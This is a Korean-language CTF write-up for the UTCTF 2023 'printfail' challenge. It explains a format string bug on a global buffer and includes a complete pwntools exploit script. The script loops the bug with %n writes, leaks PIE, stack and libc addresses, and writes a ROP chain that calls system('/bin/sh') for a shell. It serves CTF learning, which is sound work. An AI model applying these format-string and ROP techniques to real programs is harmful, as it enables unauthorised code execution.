---
layout: post
title: "[UTCTF 2023] Printfail write-up"
date: 2023-03-28 15:00:00 +0900
categories: [Security, CTF]
tags: [CTF, linux, FSB]
media_subpath: /assets/img/2023-03-29-printfail
---

## [0x00] 요약

---

BSS 입력 버퍼를 대상으로 FSB가 발생할 때, stack-to-stack pointer를 활용하여 익스플로잇하는 문제

## [0x01] 접근 방법

---

![buf](1.png)

512바이트 전역 배열 buf가 존재합니다.

![run_round](2.png)

그리고, main 함수에서 위와 같은 함수를 실행해주는데, 단순하게 Format String Bug가 전역 변수를 대상으로 발생하는 상황입니다.

본래 로직대로라면, 1자리 이상의 값을 입력할 경우, `a1`의 값이 0으로 덮어써지게 되고 이 함수는 한 번의 실행밖에 못 하는 것이 정상입니다. 이 상황을 해결하려면 어떻게 해야 할까요?

## [0x02] 분석

---

본래 로직대로라면, 1자리 이상의 값을 입력할 경우, `run_round` 함수의 첫 번째 인자인 `a1`의 값이 0으로 덮어써지게 되고 이 함수는 한 번의 실행밖에 못 하는 것이 정상입니다.

그러나, `run_round` 함수의 인자로 `a1`의 주소가 들어있다는 점을 이용한다면, 해당 주소에 값을 덮어쓸 수 있고 이로 인해 반복적인 FSB 실행이 가능하게 됩니다.

![printf](3.png)

위는 printf 함수가 호출되기 직전의 스택 상황을 살펴본 것입니다. 7번째 인자 부분에 a1 포인터 변수가 위치한 것을 확인할 수 있습니다.

이제 이 값을 반복적으로 덮어줌(`%7$n`)으로써, FSB를 여러 번 호출하고 익스플로잇에 성공해봅시다. (이때, 입력이 수행되는 buf가 BSS 영역에 위치하고 있음에 주의합니다.)

이를 해결할 수 있는 방법으로는 스택에서 스택을 가리키고 있는 값을 이용하였습니다.

![stack](4.png)

위는 `run_round + 132` 부분으로, `printf` 함수를 호출하기 직전의 스택 상황입니다. 이때, 15번째 인자의 값이 스택(빨간색 네모)을 가리키고 있고, 그 주소(주황색 네모) 또한 스택을 가리키고 있습니다. 이를 이용하면, 15번째 인자를 2바이트(`%15$hn`)만큼 원하는 스택 주소로 덮어쓰고, 43번째 인자에서 원하는 값을 작성할 수 있고, 이로 인해 스택에 원하는 값을 작성할 수 있게 됩니다.

## [0x03] 익스플로잇

---

```python
from pwn import *

def overwrite_2(addr, val):
    payload = f'%{addr % 0x10000}c%15$hn%7$n'.encode()
    p.sendlineafter(b'\n', payload)
    p.recvuntil(b"I'll give you another chance.\n")

    if val == 0:
        payload = f'%43$hn%c%7$n'.encode()
    else:
        payload = f'%{val}c%43$hn%7$n'.encode()
    p.sendlineafter(b'\n', payload)
    p.recvuntil(b"I'll give you another chance.\n")

def overwrite_4(addr, val):
    overwrite_2(addr, val & 0xFFFF)
    overwrite_2(addr + 2, val >> 16)

def overwrite_8(addr, val):
    overwrite_4(addr, val & 0xFFFFFFFF)
    overwrite_4(addr + 4, val >> 32)

context.terminal = ["tmux", "splitw", "-h"]
p = process('./pwn_printfail', aslr=1)
libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so', False)

payload = b'%6$p:%7$p:%7$n'
p.sendlineafter(b"\n", payload)

PIE_base = int(p.recvuntil(b":", drop=True), 16) - 0x1120
Stack = int(p.recvuntil(b":", drop=True), 16) - 0x24
RET = Stack + 0x38

log.success(f"PIE base : {hex(PIE_base)}")
log.success(f"main RET : {hex(RET)}")

overwrite_8(RET, PIE_base + 0x3FA0)
payload = b'%13$s:%7$n'
p.sendlineafter(b"\n", payload)
p.recvuntil(b"I'll give you another chance.\n")
libc.address = u64(p.recv(6) + b'\x00\x00') - libc.symbols['puts']
log.success(f"libc base : {hex(libc.address)}")

pop_rdi = PIE_base + 0x1373
pop_r14_r15 = PIE_base + 0x1370
binsh = list(libc.search(b"/bin/sh"))[0]

log.info(f"pop_rdi : {hex(pop_rdi)}")
log.info(f"binsh : {hex(binsh)}")
log.info(f"system : {hex(libc.symbols['system'])}")
overwrite_8(RET, pop_r14_r15)
overwrite_8(RET + 0x18, pop_rdi)
overwrite_8(RET + 0x20, binsh)
overwrite_8(RET + 0x28, libc.symbols['system'])
p.sendlineafter(b"chance.\n", b'1')

p.interactive()
```

처음에는 rtld_global로 libc leak을 수행했는데, 원격 환경에서는 익스플로잇이 안 되길래 puts GOT를 출력하여 libc leak을 다시 수행하였습니다. 그리고, 스택의 RET 부분에 ROP 페이로드를 작성하여 익스플로잇을 수행하였습니다.

![flag](5.png)

 `utflag{one_printf_to_rule_them_all}`

## [0x04] 참고 자료

---

- 출제자 write-up: [https://github.com/utisss/UTCTF-23/tree/main/puffer/pwn-printfail](https://github.com/utisss/UTCTF-23/tree/main/puffer/pwn-printfail)
    - 풀이는 저와 똑같습니다. 다만 ROP 클래스를 활용해서 익스플로잇을 쉽게 짜는 건 부럽긴 하네요. 참고해야겠습니다.
- MIsutgaRU님 write-up: [https://mi-sutga-ru.tistory.com/23](https://mi-sutga-ru.tistory.com/23)
    - `_dl_fini` 함수 내부 루틴을 활용한 익스플로잇입니다.
    - `_dl_fini`->`add_r14_gadget`->`main`->`one_gadget` 순서로 호출하여, 쉘을 따낸 방식인데, 본래 `_fini_array`를 가리키고 있던 값을 buf로 옮긴 것도 중요하지만, `add_r14_gadget`을 활용하여 연속적으로 원하는 가젯을 호출하였다는 것이 더 중요합니다. 나중에 다른 문제를 풀 때도 참고할 수 있을만한 방법으로 보입니다.